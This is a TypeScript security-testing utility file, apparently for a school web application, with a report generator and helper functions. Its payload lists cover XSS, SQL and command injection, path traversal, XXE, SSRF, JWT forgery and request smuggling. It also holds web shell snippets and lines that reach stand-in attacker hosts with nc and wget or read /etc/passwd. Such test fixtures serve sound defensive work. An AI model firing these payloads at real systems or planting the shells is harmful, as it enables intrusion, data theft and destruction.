/**
 * Security Test Utilities
 * 
 * Helper functions and utilities for comprehensive security testing
 */

import * as crypto from 'crypto';
import * as fs from 'fs';
import * as path from 'path';

/**
 * Generate a fake JWT token for testing
 */
export function generateFakeJWT(payload: object, algorithm: string = 'HS256'): string {
    const header = Buffer.from(JSON.stringify({ alg: algorithm, typ: 'JWT' })).toString('base64url');
    const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
    const signature = crypto.randomBytes(32).toString('base64url');
    return `${header}.${payloadB64}.${signature}`;
}

/**
 * Generate JWT with 'none' algorithm
 */
export function generateNoneAlgJWT(payload: object): string {
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
    return `${header}.${payloadB64}.`;
}

/**
 * Common XSS payloads for testing
 */
export const XSS_PAYLOADS = {
    basic: [
        '<script>alert("XSS")</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert`1`</script>',
    ],
    image: [
        '<img src=x onerror=alert("XSS")>',
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    ],
    svg: [
        '<svg onload=alert("XSS")>',
        '<svg/onload=alert("XSS")>',
        '<svg><script>alert("XSS")</script></svg>',
    ],
    eventHandlers: [
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<button onclick=alert("XSS")>Click</button>',
        '<div onmouseover=alert("XSS")>Hover me</div>',
    ],
    iframe: [
        '<iframe src="javascript:alert(\'XSS\')">',
        '<iframe onload=alert("XSS")>',
    ],
    object: [
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
    ],
    template: [
        '{{constructor.constructor(\'alert(1)\')()}}',
        '${alert(1)}',
        '<%= alert(1) %>',
    ],
    polyglot: [
        '\'"--></style></script><script>alert("XSS")</script>',
        '\'"--><svg onload=alert("XSS")>',
        '--><script>alert("XSS")</script>',
    ],
    encoding: [
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    ],
};

/**
 * SQL Injection payloads
 */
export const SQL_INJECTION_PAYLOADS = [
    // Basic SQLi
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    
    // Union based
    "' UNION SELECT * FROM users--",
    "' UNION SELECT null, version()--",
    "' UNION SELECT username, password FROM users--",
    
    // Error based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    
    // Time based
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    
    // Stacked queries
    "'; DROP TABLE users; --",
    "'; DELETE FROM users; --",
    "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
    
    // Comment variations
    "' OR '1'='1' -- -",
    "' OR '1'='1' #",
    "' OR '1'='1'--",
    
    // Boolean based
    "' AND 1=1--",
    "' AND 1=2--",
    
    // NoSQL injection
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
];

/**
 * Command injection payloads
 */
export const COMMAND_INJECTION_PAYLOADS = [
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '`cat /etc/passwd`',
    '$(cat /etc/passwd)',
    '; ls -la',
    '| ls -la',
    '&& whoami',
    '|| whoami',
    '; id',
    '| id',
    '$(id)',
    '`id`',
    '; ping -c 4 attacker.com',
    '| nc attacker.com 4444',
    '&& wget http://attacker.com/shell.sh',
];

/**
 * Path traversal payloads
 */
export const PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '.../.../.../etc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '%252e%252e%252fetc/passwd',
];

/**
 * File upload malicious content
 */
export const MALICIOUS_FILE_CONTENTS = {
    php: [
        '<?php echo shell_exec($_GET["cmd"]); ?>',
        '<?php system($_POST["cmd"]); ?>',
        '<?php eval($_POST["code"]); ?>',
        '<?php @assert($_REQUEST["cmd"]); ?>',
        '<?php passthru($_GET["cmd"]); ?>',
    ],
    jsp: [
        '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        '<% out.println(Runtime.getRuntime().exec("whoami")); %>',
    ],
    asp: [
        '<% Set objShell = CreateObject("WScript.Shell") %>',
        '<% Response.Write(objShell.Exec("cmd.exe /c " & Request("cmd")).StdOut.ReadAll()) %>',
    ],
    htaccess: [
        'AddType application/x-httpd-php .jpg',
        'php_flag engine on',
    ],
};

/**
 * Create a test file with specific content
 */
export function createTestFile(
    directory: string,
    filename: string,
    content: string | Buffer,
): string {
    if (!fs.existsSync(directory)) {
        fs.mkdirSync(directory, { recursive: true });
    }
    
    const filePath = path.join(directory, filename);
    fs.writeFileSync(filePath, content);
    return filePath;
}

/**
 * Create a polyglot file (valid image header + malicious content)
 */
export function createPolyglotImage(
    directory: string,
    filename: string,
    maliciousContent: string,
): string {
    // JPEG magic bytes
    const jpegHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46]);
    const content = Buffer.concat([
        jpegHeader,
        Buffer.from(maliciousContent),
    ]);
    
    return createTestFile(directory, filename, content);
}

/**
 * Generate a malicious SVG with embedded script
 */
export function createMaliciousSVG(directory: string, filename: string): string {
    const svgContent = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
    <script type="text/javascript">
        alert('XSS from SVG');
    </script>
    <rect width="100" height="100" fill="red"/>
</svg>`;
    
    return createTestFile(directory, filename, svgContent);
}

/**
 * LDAP injection payloads
 */
export const LDAP_INJECTION_PAYLOADS = [
    '*)(uid=*))(&(uid=*',
    '*)(objectClass=*',
    'admin)(&))',
    '*)(|(mail=*))',
    '*)(&',
    '*))%00',
    'admin*)(objectClass=*',
];

/**
 * XPath injection payloads
 */
export const XPATH_INJECTION_PAYLOADS = [
    "' or '1'='1",
    "'] | //* | //*['",
    '/child::node()',
    '//user[name/text()=\'admin\']',
    "' or '1'='1' or '1'='1",
    'x\' or name()=\'username\' or \'x\'=\'y',
];

/**
 * XXE (XML External Entity) payloads
 */
export const XXE_PAYLOADS = [
    `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`,
    
    `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd" >]>
<foo>&xxe;</foo>`,
];

/**
 * SSRF (Server-Side Request Forgery) payloads
 */
export const SSRF_PAYLOADS = [
    'http://localhost:22/',
    'http://127.0.0.1:22/',
    'http://[::1]:22/',
    'http://0.0.0.0:22/',
    'file:///etc/passwd',
    'http://169.254.169.254/latest/meta-data/', // AWS metadata
    'http://metadata.google.internal/', // GCP metadata
    'http://192.168.1.1/',
    'http://10.0.0.1/',
    'http://172.16.0.1/',
    'dict://localhost:22/',
    'ftp://localhost:22/',
    'gopher://localhost:22/',
];

/**
 * JWT attack payloads
 */
export const JWT_ATTACK_PAYLOADS = {
    // Algorithm confusion
    noneAlgorithm: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBY2tlciIsImlhdCI6MTUxNjIzOTAyMn0.',
    
    // Empty signature
    emptySignature: (payload: object) => {
        const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
        const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
        return `${header}.${payloadB64}.`;
    },
};

/**
 * HTTP Header injection payloads
 */
export const HEADER_INJECTION_PAYLOADS = [
    'value\r\nSet-Cookie: hacked=true',
    'value\nSet-Cookie: hacked=true',
    'value\r\nX-Injected: header',
    'value\x0d\x0aSet-Cookie: hacked=true',
];

/**
 * HTTP Parameter pollution payloads
 */
export const PARAMETER_POLLUTION_PAYLOADS = [
    { id: ['value1', 'value2'] },
    { role: ['admin', 'user'] },
    { action: ['delete', 'update'] },
];

/**
 * Unicode normalization attack payloads
 */
export const UNICODE_ATTACK_PAYLOADS = [
    'аdmin@school.com', // Cyrillic 'а' (U+0430) instead of Latin 'a' (U+0061)
    'adｍin@school.com', // Fullwidth Latin Small Letter M (U+FF4D)
    'admin@ѕchool.com', // Cyrillic Small Letter Dze (U+0455)
    'аdministrator@school.com', // Mixed scripts
];

/**
 * HTTP Request smuggling payloads
 */
export const REQUEST_SMUGGLING_PAYLOADS = [
    {
        description: 'CL.TE variation',
        headers: {
            'Content-Length': '6',
            'Transfer-Encoding': 'chunked',
        },
        body: '0\r\n\r\nG',
    },
    {
        description: 'TE.CL variation',
        headers: {
            'Content-Length': '4',
            'Transfer-Encoding': 'chunked',
        },
        body: '5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    },
];

/**
 * Cache poisoning payloads
 */
export const CACHE_POISONING_PAYLOADS = [
    { header: 'X-Forwarded-Host', value: 'evil.com' },
    { header: 'X-HTTP-Host-Override', value: 'evil.com' },
    { header: 'X-Forwarded-Scheme', value: 'https' },
    { header: 'X-Original-URL', value: '/admin' },
    { header: 'X-Rewrite-URL', value: '/admin' },
];

/**
 * Generate random string
 */
export function randomString(length: number): string {
    return crypto.randomBytes(Math.ceil(length / 2))
        .toString('hex')
        .slice(0, length);
}

/**
 * Generate random email
 */
export function randomEmail(): string {
    return `test-${randomString(8)}@school.com`;
}

/**
 * Generate random password
 */
export function randomPassword(length: number = 12): string {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
    let password = '';
    for (let i = 0; i < length; i++) {
        password += charset[Math.floor(Math.random() * charset.length)];
    }
    return password;
}

/**
 * Sleep utility for timing tests
 */
export function sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Format bytes to human readable string
 */
export function formatBytes(bytes: number): string {
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    if (bytes === 0) return '0 Bytes';
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return `${Math.round(bytes / Math.pow(1024, i) * 100) / 100} ${sizes[i]}`;
}

/**
 * Validate UUID v4 format
 */
export function isValidUUID(str: string): boolean {
    const uuidV4Regex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
    return uuidV4Regex.test(str);
}

/**
 * Generate test credit card numbers (PCI compliant - these are test numbers)
 */
export const TEST_CREDIT_CARDS = {
    visa: '4111111111111111',
    mastercard: '5555555555554444',
    amex: '378282246310005',
    discover: '6011111111111117',
    invalid: '1234567890123456',
};

/**
 * Security test categories for reporting
 */
export const SECURITY_CATEGORIES = {
    AUTHENTICATION: '🔐 Authentication Bypass',
    AUTHORIZATION: '🔒 Authorization (IDOR & Privilege Escalation)',
    INJECTION: '💉 Injection (SQL, NoSQL, Command)',
    XSS: '🔴 Cross-Site Scripting (XSS)',
    FILE_UPLOAD: '📁 File Upload Security',
    CSRF: '🛡️ Cross-Site Request Forgery (CSRF)',
    RATE_LIMITING: '⏱️ Rate Limiting',
    INFO_DISCLOSURE: '🔍 Information Disclosure',
    INPUT_VALIDATION: '✅ Input Validation',
    BUSINESS_LOGIC: '💼 Business Logic',
};

/**
 * Severity levels for security findings
 */
export enum Severity {
    CRITICAL = 'CRITICAL',
    HIGH = 'HIGH',
    MEDIUM = 'MEDIUM',
    LOW = 'LOW',
    INFO = 'INFO',
}

/**
 * Security finding interface
 */
export interface SecurityFinding {
    category: string;
    test: string;
    severity: Severity;
    description: string;
    evidence: string;
    recommendation: string;
}

/**
 * Generate security report
 */
export function generateSecurityReport(findings: SecurityFinding[]): string {
    const report = [
        '# Security Test Report',
        `Generated: ${new Date().toISOString()}`,
        '',
        '## Summary',
        `- Total Findings: ${findings.length}`,
        `- Critical: ${findings.filter(f => f.severity === Severity.CRITICAL).length}`,
        `- High: ${findings.filter(f => f.severity === Severity.HIGH).length}`,
        `- Medium: ${findings.filter(f => f.severity === Severity.MEDIUM).length}`,
        `- Low: ${findings.filter(f => f.severity === Severity.LOW).length}`,
        `- Info: ${findings.filter(f => f.severity === Severity.INFO).length}`,
        '',
        '## Findings',
        '',
    ];

    for (const finding of findings) {
        report.push(`### ${finding.test}`);
        report.push(`- **Category:** ${finding.category}`);
        report.push(`- **Severity:** ${finding.severity}`);
        report.push(`- **Description:** ${finding.description}`);
        report.push(`- **Evidence:** ${finding.evidence}`);
        report.push(`- **Recommendation:** ${finding.recommendation}`);
        report.push('');
    }

    return report.join('\n');
}
